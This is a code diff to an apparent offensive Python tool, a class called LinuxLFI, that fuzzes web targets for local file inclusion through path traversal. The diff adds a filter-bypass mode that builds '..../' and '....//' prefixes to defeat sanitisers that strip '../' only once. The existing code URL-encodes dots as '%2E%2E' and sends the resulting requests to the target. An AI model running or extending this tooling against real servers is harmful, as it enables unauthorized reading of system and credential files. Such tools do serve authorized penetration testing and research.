@@ -11,8 +11,11 @@ class LinuxLFI:
         threads_count = int('1') if parse.threads == None else int(parse.threads)
         batch = []
         for i in range(len(file_paths)):
-            path = LinuxLFI.get_walk_count(file_paths[i], int(parse.walkcount))
-            # Normal path
+            path = None
+            if parse.nonrecursive:
+                path = LinuxLFI.get_non_recursive_filter_walk_count(file_paths[i], int(parse.walkcount))
+            else:
+                path = LinuxLFI.get_walk_count(file_paths[i], int(parse.walkcount))
             batch.append(parse.target + path)
             # URL encoded path
             url_encoded_path = parse.target + urllib.parse.quote(path, encoding='utf-8', safe='').replace("..", "%2E%2E")
@@ -40,6 +43,15 @@ class LinuxLFI:
         async with session.get(url) as response:
             return await response.text()
     
+    @staticmethod
+    def get_non_recursive_filter_walk_count(path, count):
+        for i in range(count):
+            if i == 0:
+                path = "..../" + path
+            else:
+                path = "....//" + path
+        return path
+
     @staticmethod
     def get_walk_count(path, count): 
         for i in range(count):
